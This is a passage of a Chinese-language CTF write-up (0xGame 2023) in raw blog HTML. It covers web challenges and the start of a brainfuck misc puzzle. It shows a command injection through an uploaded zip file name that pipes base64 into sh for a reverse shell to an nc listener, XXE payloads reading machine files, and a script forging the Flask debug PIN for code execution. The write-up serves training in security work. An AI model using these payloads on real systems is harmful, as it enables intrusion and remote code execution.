Flask(__name__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">m</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(m.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/unzip&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">unzip</span>():<br>    f = request.files.get(<span class="hljs-string">&#x27;file&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> f.filename.endswith(<span class="hljs-string">&#x27;.zip&#x27;</span>):<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br><br>    user_dir = os.path.join(<span class="hljs-string">&#x27;./uploads&#x27;</span>, md5(request.remote_addr))<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(user_dir):<br>        os.mkdir(user_dir)<br><br>    zip_path = os.path.join(user_dir, f.filename)<br>    dest_path = os.path.join(user_dir, f.filename[:-<span class="hljs-number">4</span>])<br>    f.save(zip_path)<br><br>    os.system(<span class="hljs-string">&#x27;unzip -o &#123;&#125; -d &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(zip_path, dest_path))<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, defaults=&#123;<span class="hljs-string">&#x27;subpath&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&lt;path:subpath&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">subpath</span>):<br>    user_dir = os.path.join(<span class="hljs-string">&#x27;./uploads&#x27;</span>, md5(request.remote_addr))<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(user_dir):<br>        os.mkdir(user_dir)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;..&#x27;</span> <span class="hljs-keyword">in</span> subpath:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;blacklist&#x27;</span><br><br>    current_path = os.path.join(user_dir, subpath)<br><br>    <span class="hljs-keyword">if</span> os.path.isdir(current_path):<br>        res = []<br>        res.append(&#123;<span class="hljs-string">&#x27;type&#x27;</span>: <span class="hljs-string">&#x27;Directory&#x27;</span>, <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;..&#x27;</span>&#125;)<br>        <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> os.listdir(current_path):<br>            <span class="hljs-keyword">if</span> os.path.isfile(os.path.join(current_path, v)):<br>                res.append(&#123;<span class="hljs-string">&#x27;type&#x27;</span>: <span class="hljs-string">&#x27;File&#x27;</span>, <span class="hljs-string">&#x27;name&#x27;</span>: v&#125;)<br>            <span class="hljs-keyword">else</span>:<br>                res.append(&#123;<span class="hljs-string">&#x27;type&#x27;</span>: <span class="hljs-string">&#x27;Directory&#x27;</span>, <span class="hljs-string">&#x27;name&#x27;</span>: v&#125;)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, upload_path=user_dir, res=res)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> send_file(current_path)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8000</span>, debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p>关键代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">unzip</span>():<br>    f = request.files.get(<span class="hljs-string">&#x27;file&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> f.filename.endswith(<span class="hljs-string">&#x27;.zip&#x27;</span>):<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br><br>    user_dir = os.path.join(<span class="hljs-string">&#x27;./uploads&#x27;</span>, md5(request.remote_addr))<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(user_dir):<br>        os.mkdir(user_dir)<br><br>    zip_path = os.path.join(user_dir, f.filename)<br>    dest_path = os.path.join(user_dir, f.filename[:-<span class="hljs-number">4</span>])<br>    f.save(zip_path)<br><br>    os.system(<span class="hljs-string">&#x27;unzip -o &#123;&#125; -d &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(zip_path, dest_path))<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br></code></pre></td></tr></table></figure><p>在<code>os.system(&#39;unzip -o &#123;&#125; -d &#123;&#125;&#39;.format(zip_path, dest_path))</code>可能有命令执行漏洞，直接反弹shell</p><p>因为windows文件名不能带<code>|</code> ，所以抓包把文件名改成<code>;echo &#39;xxx&#39; | base64 -d | sh.zip</code></p><p>其中xxx里是你要反弹shell的命令的base64加密结果</p><p>改完文件名后上传，并在公网的服务器执行<code>nc -lk port</code></p><p>其中lk表示一直监听直到有人来连</p><p><img src="/2023/10/22/0xGameCTF2023/image-20231105111416683.png" alt="image-20231105111416683"></p><h3 id="rss-parser"><a href="#rss-parser" class="headerlink" title="rss_parser"></a>rss_parser</h3><p>etree.parse 的过程存在 XXE 漏洞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">etree.parse(BytesIO(content), etree.XMLParser(resolve_entities=<span class="hljs-literal">True</span>))<br></code></pre></td></tr></table></figure><p>将一个符合 RSS Feed XML 标准的 payload 放到 HTTP 服务器上就可以 XXE</p><p>服务器要开启apache服务，然后上传的xml文件需要在<code>/var/www/html</code> 目录下</p><p>但是无法直接读取 &#x2F;flag 文件, 这里考察获取 Flask 在 Debug 模式下的 PIN Code 以实现 RCE</p><p><a href="https://xz.aliyun.com/t/8092">https://xz.aliyun.com/t/8092</a></p><p><a href="https://www.tr0y.wang/2022/05/16/SecMap-flask/">https://www.tr0y.wang/2022/05/16/SecMap-flask/</a></p><p>读取str(uuid.getnode()),  &#x2F;sys&#x2F;class&#x2F;net&#x2F;ens33&#x2F;address</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [ </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///sys/class/net/eth0/address&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">rss</span> <span class="hljs-attr">xmlns:atom</span>=<span class="hljs-string">&quot;http://www.w3.org/2005/Atom&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;2.0&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">channel</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">link</span>&gt;</span>https://exp10it.cn/<span class="hljs-tag">&lt;/<span class="hljs-name">link</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">item</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">link</span>&gt;</span>https://exp11it.cn/<span class="hljs-tag">&lt;/<span class="hljs-name">link</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">channel</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">rss</span>&gt;</span><br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">02</span>:<span class="hljs-number">42</span>:ac:<span class="hljs-number">1</span>e:<span class="hljs-number">00</span>:<span class="hljs-number">02</span><br>转十进制<br><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-string">&#x27; 02:42:ac:1e:00:02&#x27;</span>.replace(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)</span></span>,<span class="hljs-number">16</span>)<br><span class="hljs-number">2485378744322</span><br></code></pre></td></tr></table></figure><p>读取get_machine_id(), &#x2F;etc&#x2F;machine-id</p><p>因为这里不存在 &#x2F;etc&#x2F;machine-id, 所以读取 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id</p><p><img src="/2023/10/22/0xGameCTF2023/1699199235253.png" alt="1699199235253"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///proc/sys/kernel/random/boot_id&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">rss</span> <span class="hljs-attr">xmlns:atom</span>=<span class="hljs-string">&quot;http://www.w3.org/2005/Atom&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;2.0&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">channel</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">link</span>&gt;</span>https://exp10it.cn/<span class="hljs-tag">&lt;/<span class="hljs-name">link</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">item</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">link</span>&gt;</span>https://exp10it.cn/<span class="hljs-tag">&lt;/<span class="hljs-name">link</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">channel</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">rss</span>&gt;</span><br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">5dcbb593</span>-<span class="hljs-number">2656</span>-<span class="hljs-number">4</span>e8e-a4e9-<span class="hljs-number">9</span>a0afb803c47<br></code></pre></td></tr></table></figure><p>然后根据上面的文章, 读取 <code>/proc/self/cgroup</code> 显示 <code>0::/</code>, 也就是没有 id 值, 所以不用拼接, 直接用上面的 boot id 就行</p><p>剩下的 username 可以通过读取 <code>/etc/passwd</code> 来猜一下, 一般都是 <code>root</code> 或者最底下的用户 <code>app</code>, 多试几个就行</p><p>最后随便填一个 url, 比如 <code>https://exp10it.cn/xxx</code> 就能在报错页面看到 flask 的路径</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;app&#x27;</span><span class="hljs-comment"># username</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,<span class="hljs-comment"># modname</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,<span class="hljs-comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.9/site-packages/flask/app.py&#x27;</span> <span class="hljs-comment"># getattr(mod, &#x27;__file__&#x27;, None),</span><br>]<br><br>private_bits = [<br>    <span class="hljs-string">&#x27;2485378744322&#x27;</span>,<span class="hljs-comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span><br>    <span class="hljs-string">&#x27;5dcbb593-2656-4e8e-a4e9-9a0afb803c47&#x27;</span><span class="hljs-comment"># get_machine_id(), /etc/machine-id</span><br>]<br><br>h = hashlib.sha1()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&quot;cookiesalt&quot;</span>)<br><br>cookie_name = <span class="hljs-string">f&quot;__wzd<span class="hljs-subst">&#123;h.hexdigest()[:<span class="hljs-number">20</span>]&#125;</span>&quot;</span><br><br><span class="hljs-comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span><br><span class="hljs-comment"># end up with the same value and generate out 9 digits</span><br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&quot;pinsalt&quot;</span>)<br>    num = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>):09d&#125;</span>&quot;</span>[:<span class="hljs-number">9</span>]<br><br><span class="hljs-comment"># Format the pincode in groups of digits for easier remembering if</span><br><span class="hljs-comment"># we don&#x27;t have a result yet.</span><br>rv = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&quot;-&quot;</span>.join(<br>                num[x : x + group_size].rjust(group_size, <span class="hljs-string">&quot;0&quot;</span>)<br>                <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size)<br>            )<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><br><span class="hljs-built_in">print</span>(rv)<br><span class="hljs-comment">#234-057-353</span><br></code></pre></td></tr></table></figure><p>输入console跳转</p><p>输入pin码</p><p><img src="/2023/10/22/0xGameCTF2023/1699198767854.png" alt="1699198767854"></p><h2 id="Misc-2"><a href="#Misc-2" class="headerlink" title="Misc"></a>Misc</h2><h3 id="miversc"><a href="#miversc" class="headerlink" title="miversc"></a>miversc</h3><blockquote><p>A:你猜我最喜欢的编程语言是什么，提示一下，语言的名字有3个字符，并且其中的两个基本是一样的</p><p>B:这不是一眼丁真,我也喜欢写C++</p><p>A:不不不，不是，是这个(掏出miverse.txt)</p><p>B:啊？</p><p>Hint 1: 多注意题目名，flag不是直接ook to text得到的</p></blockquote><p><img src="/2023/10/22/0xGameCTF2023/1699164941026.png" alt="1699164941026"></p><p>ook手动转brainfuck(NOTEPAD++)</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck">&gt;<span class="hljs-literal">++++++++</span><br><span class="hljs-title">[</span>&gt;&gt;<span class="hljs-literal">++</span>&gt;<span class="hljs-literal">++++</span>&gt;<span class="hljs-literal">++++++</span>&gt;<span class="hljs-literal">++++++++</span>&gt;<span class="hljs-literal">++++++++++</span>&gt;<span class="hljs-literal">++++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++</span><br><span class="hljs-literal">++</span>&gt;<span class="hljs-literal">++++++++++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++</span><br><span class="hljs-literal">++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++++++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++++++++++++++++</span>&gt;<span class="hljs-literal">+++++++++++++</span><br><span class="hljs-literal">+++++++++++++++++</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<span class="hljs-literal">-</span><span class="hljs-title">]</span>&gt;&gt;&gt;&gt;&gt;<span class="hljs-literal">++++++++</span><span class="hljs-string">.</span>&gt;&gt;<span class="hljs-literal">+++++</span><span class="hljs-string">.</span>&gt;<span class="hljs-literal">----</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">+++</span><span class="hljs-string">.</span>&lt;&lt;&lt;&lt;<span class="hljs-literal">----</span><span class="hljs-string">.</span><br>&lt;<span class="hljs-string">.</span>&gt;&gt;&gt;&gt;&gt;<span class="hljs-literal">+</span><span class="hljs-string">.</span><span class="hljs-literal">----</span><span class="hljs-string">.</span>&lt;<span class="hljs-string">.</span><span class="hljs-literal">----</span><span class="hljs-string">.</span>&gt;<span class="hljs-literal">+++++++</span><span class="hljs-string">.</span>&lt;<span class="hljs-literal">++++</span><span class="hljs-string">.</span>&lt;&lt;&lt;&lt;<span class="hljs-string">.</span>&gt;&gt;&gt;&gt;<span class="hljs-literal">++++</span><span class="hljs-string">.</span><span class="hljs-literal">+++++</span><span class="hljs-string">.</span><span class="hljs-literal">++</span><span class="hljs-string">.</span>&gt;<span class="hljs-literal">++</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span>&lt;&lt;&lt;&lt;&lt;<span class="hljs-string">.</span>&gt;&gt;&gt;&gt;&gt;<span class="hljs-string">.</span>&lt;<span class="hljs-literal">---</span><br><span class="hljs-literal">-----</span><span class="hljs-string">.</span><span class="hljs-literal">---</span><span class="hljs-string">.</span>&lt;&lt;&lt;&lt;<span class="hljs-string">.</span>&gt;&gt;&gt;&gt;<span class="hljs-literal">+</span><span class="hljs-string">.</span><span class="hljs-literal">++++++</span><span class="hljs-string">.</span><span class="hljs-literal">-----------</span><span class="hljs-string">.</span><span class="hljs-literal">++++++</span><span class="hljs-string">.</span><span class="hljs-title">[</span>&gt;<span class="hljs-title">]</span><span class="hljs-literal">+</span><span class="hljs-title">[</span><span class="hljs-title">[</span><span class="hljs-literal">-</span><span class="hljs-title">]</span>&lt;<span class="hljs-title">]</span>&gt;<span class="hljs-string">,</span>&lt;<span class="hljs-literal">++++++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">--------</span>&lt;<span class="hljs-title">]</span>&gt;<span class="hljs-string">,</span><br>&lt;<span class="hljs-literal">++++++++++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">------------</span>&lt;<span class="hljs-title">]</span>&gt;<span class="hljs-string">,</span><span class="hljs-literal">-</span>&lt;<span class="hljs-literal">+++++++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">----------</span>&lt;<span class="hljs-title">]</span>&gt;<span class="hljs-string">,</span><span class="hljs-literal">--</span>&lt;<span class="hljs-literal">+++++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">--------------</span><br><span class="hljs-literal">-----</span>&lt;<span class="hljs-title">]</span>&gt;<span class="hljs-string">,</span><span class="hljs-literal">+</span>&lt;<span class="hljs-literal">++++++++++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">-----------</span>&lt;<span class="hljs-title">]</span>&gt;<span class="hljs-string">,</span><span class="hljs-literal">-</span>&lt;<span class="hljs-literal">++++++++++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">----------</span>&lt;<span class="hljs-title">]</span>&gt;<span class="hljs-string">,</span><span class="hljs-literal">---</span><br>&lt;<span class="hljs-literal">++++++++++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">------------</span>&lt;<span class="hljs-title">]</span>&gt;<span class="hljs-string">,</span><span class="hljs-literal">+</span>&lt;<span class="hljs-literal">+++++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">---------------</span>&lt;<span class="hljs-title">]</span>&gt;<span class="hljs-string">,</span><span class="hljs-literal">+++</span>&lt;<span class="hljs-literal">++++++++++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">-----</span><br><span class="hljs-literal">-------</span>&lt;<span class="hljs-title">]</span>&gt;<span class="hljs-string">,</span>&lt;<span class="hljs-literal">+++++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">-----------------------</span>&lt;<span class="hljs-title">]</span>&gt;<span class="hljs-string">,</span>&lt;<span class="hljs-literal">++++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">--------------------------</span><br><span class="hljs-literal">---</span>&lt;<span class="hljs-title">]</span>&gt;<span class="hljs-string">,</span>&lt;<span class="hljs-literal">+++++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">-------------------</span>&lt;<span class="hljs-title">]</span>&gt;<span class="hljs-string">,</span><span class="hljs-literal">--</span>&lt;<span class="hljs-literal">++++++++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">----------</span>&lt;<span class="hljs-title">]</span>&gt;<span class="hljs-string">,</span><span class="hljs-literal">-</span>&lt;<span class="hljs-literal">++++++++++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span><br>&gt;<span class="hljs-literal">----------</span>&lt;<span class="hljs-title">]</span>&gt;<span class="hljs-string">,</span><span class="hljs-literal">++</span>&lt;<span class="hljs-literal">++++++++++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">------------</span>&lt;<span class="hljs-title">]</span>&gt;<span class="hljs-string">,</span><span class="hljs-literal">-</span>&lt;<span class="hljs-literal">++++++++++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">----------</span>&lt;<span class="hljs-title">]</span>&gt;<span class="hljs-string">,</span><br>&lt;<span class="hljs-literal">++++++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">-------------------</span>&lt;<span class="hljs-title">]</span>&gt;<span class="hljs-string">,</span>&lt;<span class="hljs-literal">+++++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">-----------------------</span>&lt;<span class="hljs-title">]</span>&gt;<span class="hljs-string">,</span><span class="hljs-literal">-</span>&lt;<span class="hljs-literal">++++++++++</span><br><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">----------</span>&lt;<span class="hljs-title">]</span>&gt;<span class="hljs-string">,</span>&lt;<span class="hljs-literal">+++++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">-------------------</span>&lt;<span class="hljs-title">]</span>&gt;<span class="hljs-string">,</span><span class="hljs-literal">+</span>&lt;<span class="hljs-literal">++++++++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">----------</span>&lt;<span class="hljs-title">]</span>&gt;<span class="hljs-string">,</span><span class="hljs-literal">-</span><br>&lt;<span class="hljs-literal">++++++++++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">-----------</span>&lt;<span class="hljs-title">]</span>&gt;<span class="hljs-string">,</span>&lt;<span class="hljs-literal">+++++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">---------------</span>&lt;<span class="hljs-title">]</span>&gt;<span class="hljs-string">,</span>&lt;<span class="hljs-literal">+++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">-----------</span>&lt;<span class="hljs-title">]</span>&gt;<span class="hljs-string">,</span><br>&lt;<span class="hljs-literal">+++++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">-------------------------</span>&lt;<span class="hljs-title">]</span><span class="hljs-literal">++++++++</span><br><span class="hljs-title">[</span>&gt;&gt;<span class="hljs-literal">++</span>&gt;<span class="hljs-literal">++++</span>&gt;<span class="hljs-literal">++++++</span>&gt;<span class="hljs-literal">++++++++</span>&gt;<span class="hljs-literal">++++++++++</span>&gt;<span class="hljs-literal">++++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++</span><br><span class="hljs-literal">++</span>&gt;<span class="hljs-literal">++++++++++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++</span><br><span class="hljs-literal">++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++++++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++++++++++++++++</span>&gt;<span class="hljs-literal">+++++++++++++</span><br><span class="hljs-literal">+++++++++++++++++</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<span class="hljs-literal">-</span><span class="hljs-title">]</span>&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="hljs-literal">++++++</span><span class="hljs-string">.</span>&gt;<span class="hljs-literal">----</span><span class="hljs-string">.</span>&lt;<span class="hljs-literal">-----</span><span class="hljs-string">.</span>&gt;<span class="hljs-literal">-----</span><span class="hljs-string">.</span><br>&lt;&lt;&lt;&lt;&lt;<span 